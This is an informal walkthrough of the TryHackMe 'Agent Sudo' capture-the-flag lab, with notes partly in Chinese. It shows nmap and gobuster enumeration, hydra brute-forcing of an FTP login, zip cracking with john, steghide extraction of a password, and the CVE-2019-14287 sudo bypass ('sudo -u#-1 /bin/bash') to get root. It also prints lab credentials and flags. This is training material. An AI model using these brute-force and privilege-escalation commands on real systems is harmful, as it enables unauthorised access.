Task 2  Enumerate

nmap -sV 10.10.79.7


nmap -sV 10.10.79.7
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-12 16:14 GMT
Nmap scan report for 10.10.79.7
Host is up (0.35s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 806.86 seconds


gobuster dir -u http://10.10.79.7/ -t 100 -w directory-list-2.3-medium.txt -x html,txt,php,phtml,sh

use user agent switcher


How many open ports?
A:3

How you redirect yourself to a secret page?

A:user-agent

What is the agent name?

A:chris
burp 慢慢試到user-agent:C

Attention chris,
注意克里斯，

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!
你還記得我們的交易嗎？請盡快告訴特工 J 這些東西。另外，更改您該死的密碼，太弱了！

From,
Agent R
從，
特工 R


Task 3  Hash cracking and brute-force


FTP password
hydra -l chris -P rockyou.txt -Vv -T 64 10.10.79.7 ftp
[21][ftp] host: 10.10.79.7   login: chris   password: crystal

filezilla 連上 下載3個檔案 2個圖片 1txt
cat To_agentJ.txt
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C

尊敬的 J 代理，

所有這些像外星人一樣的照片都是假的！代理 R 將真實圖片存儲在您的目錄中。您的登錄密碼以某種方式存儲在假圖片中。這對你來說應該不是問題。

從，
特工 C
 
分離兩張圖片
foremost -T cute-alien.jpg 
foremost -T cutie.png 


cutie.png  分出來一個zip

zip2john 00000067.zip > 00000067.txt
把zip作成john認得出的格式 再用john破解

john 00000067.txt
 破出來密碼為:alien 
 解開zip 
 得到To_agentR.txt
    Agent C,

    We need to send the picture to 'QXJlYTUx' as soon as possible!

    By,
    Agent R

echo -n 'QXJlYTUx' | base64 -d
Area51

steghide info cute-alien.jpg
steghide --extract -sf cute-alien.jpg
得到message.txt


cat message.txt 
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris

scp Alien_autospy.jpg user@10.9.3.206:/tmp


Answer format: *******
Zip file password

Answer format: *****
steg password

Answer format: ******
Who is the other agent (in full name)?

Answer format: *****



Task 4  Capture the user flag



What is the user flag?


What is the incident of the photo called?



Task 5  Privilege escalation


CVE number for the escalation 

(Format: CVE-xxxx-xxxx)
sudo -l
CVE-2019-14287
sudo -u#-1 /bin/bash

Answer format: **************
What is the root flag?

Answer format: ********************************
(Bonus) Who is Agent R?

root@agent-sudo:/root# cat root.txt
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R


